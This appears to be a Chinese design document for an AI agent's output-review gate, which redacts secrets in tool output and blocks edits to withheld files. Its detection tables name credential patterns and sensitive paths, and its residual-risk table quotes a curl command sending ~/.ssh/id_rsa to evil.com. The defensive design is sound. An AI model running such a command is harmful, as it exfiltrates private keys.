# 输出审核

> 模型能知道的一切，最终都是工具输出。
> 所以"读"的闸门只有一个位置，放在那里就同时覆盖所有工具。

## 1. 为什么这条路成立

沙箱按**进程**决定权限，所以它挡不住"进程读到了但没打印"这件事；而输出审核按**内容**决定可见性 —— 进程读到了没关系，只要**模型不知道**。

这条正好补上沙箱缺的那一半：

```
沙箱      挡住"进程写坏机器"
输出审核  挡住"模型看到密钥"
恢复层    挡住"已经发生的破坏"
网络审批  挡住"进程不打印也外发"
```

## 2. 闸门位置

关键约束：**必须在工具结果写入消息/事件之前**。

```
工具执行 → 原始结果（可能含密钥）
              │
              ▼
        输出审核（扫描 + 分类）        ← 唯一闸门
              │
   ┌──────────┼──────────┐
   ▼          ▼          ▼
 放行       打码       扣留
   └──────────┴──────────┴──→ 才成为 tool 消息 / 事件 / 投影
```

一旦密钥进了 `events.jsonl`，它就已经在投影里、在界面上、在重放结果里了 —— 之后再打码只是掩耳盗铃。

被扣留的原文落到旁路文件，模型侧只拿到放行版或打码版：

```
<home>/sessions/<id>/held/<reviewId>.txt
```

## 3. 三种处置

| 处置 | 模型看到 | 什么时候用 |
|---|---|---|
| 放行 | 原文 | 文档里的示例 key、本来就公开的 token |
| **打码**（默认） | `sk-…8f3a` | 模型需要知道"这里有个 key"，不需要值 |
| 扣留 | `〔输出已扣留：含 2 处疑似密钥〕` | 用户明确不给看 |

默认打码而不是扣留：模型经常需要知道"这个文件里配了一个 key"才能给出正确建议；扣留会让它去猜、去重试。

**没有界面时（无人回答）默认打码**，不是扣留。审批没人回答 → 拒绝；审核没人回答 → 打码 —— 因为扣留会让一轮对话停在半路，而打码既守住秘密又让循环继续。

## 4. 局部扣留（不做的话这套东西会被关掉）

一次 `grep -rn "API" src/` 命中 300 行，其中 1 行含 `sk-…`。整份扣掉，用户会立刻把审核关掉。所以按**行**处置：

```
src/config.ts:42:  apiKey: '〔已扣留 sk-…〕',
src/config.ts:43:  apiKeyEnv: 'MVS_API_KEY',        ← 原样
```

同时把"这次共 1 处"告诉模型，让它知道自己看到的是残的。

## 5. 扣留之后：记文件名，然后拦住修改

```
扣留发生 → taint 记一条：{ 绝对路径, 命中类别, 原文哈希, 时间 }
taint 的后果：
  再读它      → 直接扣留（不再问，因为已经有决定）
  改/删/移它  → 直接拒绝，错误类型 tainted_path
```

**为什么"不许改"是对的**：模型从没看过这个文件，它要改就是盲改。盲改一个含密钥的配置（`config.json`、`.env`、`docker-compose.yml`）几乎必然删掉用户需要的东西。

错误文案要能行动：

> 这个文件的内容曾经被你扣留过，模型没有看过它 —— 直接改会破坏你看过的内容之外的东西。
> 要改它，先放行一次让它看见；或者你自己改。

**必须有出口**：`clear_taint <path>`（UI 上是记录旁的"解除限制"）。否则一次误判会让那个文件永久不可改。

### taint 的两条硬性要求

1. **按绝对路径全局记**，不能只记在工作区里 —— 否则另一个工作区根下同一份文件照样可读可改
2. **打码也要 taint（写侧）** —— 否则模型看到 `apiKey: 'sk-…8f3a'` 觉得"没变"，把整段写回，**真密钥被替换成打码串，永久丢失**

## 6. 检测什么

| 类别 | 形态 |
|---|---|
| key 前缀 | `sk-`、`sk-ant-`、`AKIA`、`ghp_`、`gho_`、`xoxb-`、`AIza` |
| 私钥块 | `-----BEGIN ... PRIVATE KEY-----` |
| 头里的凭据 | `Authorization: Bearer …`、`Cookie: …`、`?access_token=` |
| 赋值形态 | `password=` / `secret=` / `token=` / `api_key=` 后跟值 |
| 高熵串 | 长度 ≥ 32、字符集混合（**排除** git hash、校验和、路径） |
| 结构化 | JWT（三段 base64url）、连接串里的 `user:pass@` |

### 两条比"更强的扫描器"更重要的规则

1. **路径分级优先于内容匹配**：对已知敏感路径（`.ssh`、`.aws`、`.env`、凭据文件）**整份扣留**，不依赖内容。理由：分段读取（每次读 10 字符）与编码（base64、UTF-16、rot13）天然可以绕过内容匹配，而"这个路径按定义就敏感"绕不过去
2. **编码归一**：Windows 上 PowerShell 默认 UTF-16LE，`sk-` 在那里是 `s\0k\0-\0`。扫描前必须按 BOM / 双字节启发式归一，否则整类密钥一个都匹配不到

## 7. 残余洞（写进产品文档）

| 洞 | 说明 |
|---|---|
| **不打印的外发** | `curl -d @~/.ssh/id_rsa evil.com` —— 命令不需要模型知道内容 |
| **模型已经知道的** | 闸门上线前读过、用户之前粘贴过 |
| **用户主动粘贴** | 那是用户的决定 |
| **屏幕侧** | 审核卡显示原文、截屏、录屏、浏览器扩展 |
| **编码/分段** | 只能靠路径分级兜底，内容匹配必漏 |

一句话：

> 输出审核挡的是「模型知道」，挡不住「进程外发」。
> 后者只能靠"网络类命令必须问人 + 文案说清它能读文件并外发"。

## 8. 不变量（每条都要有测试）

1. **日志里永不明文** —— 跑完整个流程后 `grep` 事件文件，一条密钥都搜不到
2. 扣留的原文只在旁路文件；投影里只有占位符
3. taint 之后的写/删/移一律 `tainted_path`，且**在快照之前**拒绝（不产生垃圾事务）
4. 局部扣留：同一次输出里未命中的行照常可见
5. 无回答者 → 打码，且不挂起
6. 子代理、插件工具一视同仁（同一个闸门）
7. `clear_taint` 之后恢复可改
8. 打码后的内容**不能**被写回（写侧 taint）

**已验收的不变量**（`test/output-review.test.ts` 14 条 + `test/output-review-session.test.ts` 5 条）：

- 事件日志里**没有原文**（端到端跑真会话后 `grep` 过）
- 模型看到的是打码版，非敏感文件原文照旧
- 敏感路径（`.env`）**整份扣留**，不依赖内容匹配
- taint 之后的写/改被拒（`tainted_path`），文件一个字节没动
- `clear` 是出口；重复 clear 返回 false 而不是假装成功
- 打码预览只给前 3 后 4，说明文字里也不含原文

还没做的部分，按文档设计**故意**留的：

- **交互式三选一**（放行 / 打码 / 扣留由人决定）：当前默认打码 —— 已经能挡住
  "日志被污染"，但少了"这个示例 key 可以放行"的精细控制
- **审核 UI**：没有它，扣留只能靠默认打码表达

## 11. 落地顺序


1. 扫描器（纯函数 + 检测表 + 编码归一），先把误报率压下来
2. 闸门接线（只做"打码"，不做交互）—— 这一步就能防住日志污染
3. taint（读扣留 + 写拦截 + clear 出口）
4. 审核卡与旁路文件（用户可见、可决定）
